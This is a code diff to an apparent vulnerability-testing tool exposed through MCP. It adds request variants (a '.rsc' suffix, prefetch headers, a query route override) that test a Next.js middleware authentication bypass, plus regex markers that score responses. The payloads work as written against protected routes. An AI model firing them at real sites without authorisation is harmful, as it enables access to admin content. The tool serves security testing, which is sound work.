@@ -53,6 +53,9 @@ _CVE_TO_CLASS: dict[str, str] = {
     "CVE-2026-44791": "prototype_pollution",
     # 2026 H2 Next.js WebSocket Upgrade SSRF
     "CVE-2026-44578": "nextjs_ws_upgrade_ssrf",
+    # Next.js May-2026 middleware bypass (Vercel-official, Spec D D4)
+    "CVE-2026-44575": "nextjs_middleware_bypass",
+    "CVE-2026-44574": "nextjs_middleware_bypass",
 }
 
 
@@ -368,9 +371,42 @@ def _generic_variants(baseline: str, canary: str, action_id: str) -> list[dict[s
     return variants
 
 
+def _nextjs_middleware_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
+    """Next.js May-2026 middleware bypass (Vercel-official, Spec D D4).
+
+    CVE-2026-44575: App Router `.rsc` / segment-prefetch URLs reach protected
+    content, skipping middleware. CVE-2026-44574: a crafted query param alters
+    the dynamic-route value, hiding the path from middleware. `target_url` should
+    be the protected route (e.g. https://app/admin). A 200 with RSC content where
+    the base route returns 302/403 is the bypass signal — compare vs baseline.
+    """
+    variants: list[dict[str, Any]] = []
+    # CVE-2026-44575: .rsc suffix on the path skips middleware auth.
+    variants.append({
+        "label": "mw_bypass.rsc_suffix", "method": "GET",
+        "url_suffix": ".rsc",
+        "headers": {"RSC": "1", "X-Praetor-Canary": canary}, "body": "",
+    })
+    # CVE-2026-44575: segment-prefetch header form.
+    variants.append({
+        "label": "mw_bypass.segment_prefetch", "method": "GET",
+        "headers": {"Next-Router-Prefetch": "1", "RSC": "1",
+                    "Next-Router-State-Tree": "%5B%22%22%5D",
+                    "X-Praetor-Canary": canary}, "body": "",
+    })
+    # CVE-2026-44574: query param alters dynamic route value, hides path from mw.
+    variants.append({
+        "label": "mw_bypass.query_route_override", "method": "GET",
+        "query": f"__nextDataReq=1&_rsc={canary[:8]}",
+        "headers": {"X-Praetor-Canary": canary}, "body": "",
+    })
+    return variants
+
+
 _GENERATORS: dict[str, Any] = {
     "react_server_components": _rsc_variants,
     "nextjs_cache_poisoning":  _nextjs_cache_variants,
+    "nextjs_middleware_bypass": _nextjs_middleware_variants,
     "trpc_sspp":               _trpc_variants,
     "prototype_pollution":     _proto_variants,
     "nextjs_ws_upgrade_ssrf":  _nextjs_ws_ssrf_variants,
@@ -407,6 +443,12 @@ _WS_SSRF_MARKERS = (
     re.compile(r"\bcompute\.metadata\.azure\.com\b", re.I),
     re.compile(r'"InstanceProfile"', re.I),
 )
+_NEXTJS_MW_MARKERS = (
+    re.compile(r"text/x-component", re.I),
+    re.compile(r"Next-Router-State-Tree", re.I),
+    re.compile(r"__next_f\b"),
+    re.compile(r"self\.__next_f"),
+)
 
 
 def _score_response(klass: str, canary: str, status: int, headers_blob: str,
@@ -436,6 +478,8 @@ def _score_response(klass: str, canary: str, status: int, headers_blob: str,
         markers = _SSPP_MARKERS
     elif klass == "nextjs_ws_upgrade_ssrf":
         markers = _WS_SSRF_MARKERS
+    elif klass == "nextjs_middleware_bypass":
+        markers = _NEXTJS_MW_MARKERS
 
     hits = []
     for pat in markers:
@@ -550,6 +594,8 @@ def register(mcp: FastMCP) -> None:
                     # If operator wants to override, they should set vuln_class='generic'.
 
             url = target_url
+            if v.get("url_suffix"):  # path suffix (e.g. .rsc) — before query
+                url = f"{url}{v['url_suffix']}"
             if v.get("query"):
                 sep = "&" if "?" in url else "?"
                 url = f"{url}{sep}{v['query']}"
